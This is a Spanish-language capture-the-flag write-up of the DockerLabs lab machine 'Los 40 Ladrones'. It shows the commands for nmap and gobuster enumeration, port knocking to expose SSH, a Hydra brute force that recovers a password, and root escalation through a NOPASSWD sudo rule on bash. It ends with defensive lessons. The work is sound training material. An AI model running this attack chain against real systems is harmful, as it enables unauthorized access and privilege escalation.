# Los 40 Ladrones — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** firstatack  
**Fecha de creación:** 04/07/2024  
**Técnicas:** Nmap · Gobuster · Port Knocking · Hydra · SSH · sudo bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — defense.txt](#2-enumeración-web--defensetxt)
3. [Port Knocking — apertura de SSH](#3-port-knocking--apertura-de-ssh)
4. [Fuerza bruta SSH — Hydra](#4-fuerza-bruta-ssh--hydra)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh los40ladrones.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado inicial:

```text
80/tcp open http
```

El servicio SSH no aparece inicialmente.

---

## 2. Enumeración web — defense.txt

Accedemos al servidor web y observamos únicamente la página por defecto de Apache.

Enumeramos directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Encontramos:

```text
/defense.txt
```

Contenido:

```text
Recuerda llama antes de entrar, no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

El texto sugiere un mecanismo de **Port Knocking**.

---

## 3. Port Knocking — apertura de SSH

Utilizamos la herramienta `knock` para tocar los puertos en el orden correcto:

```bash
knock 172.17.0.2 7000 8000 9000
```

Volvemos a realizar el escaneo:

```bash
cat Puertos
```

Ahora observamos:

```text
22/tcp open ssh
80/tcp open http
```

El servicio SSH ha sido desbloqueado.

---

## 4. Fuerza bruta SSH — Hydra

El texto anterior menciona un posible usuario:

```text
toctoc
```

Realizamos fuerza bruta con Hydra:

```bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: toctoc
password: kittycat
```

Accedemos al sistema:

```bash
ssh toctoc@172.17.0.2
```

---

## 5. Escalada de privilegios

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /bin/bash
```

Escalamos privilegios:

```bash
sudo bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Port Knocking predecible | Apertura del servicio SSH |
| Contraseña débil SSH | Acceso remoto |
| sudo NOPASSWD sobre bash | Escalada inmediata a root |

**Para defenderse:**

- Utilizar secuencias de port knocking más robustas.
- Aplicar políticas de contraseñas seguras.
- Restringir accesos sudo innecesarios.
- Evitar permisos directos sobre bash.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
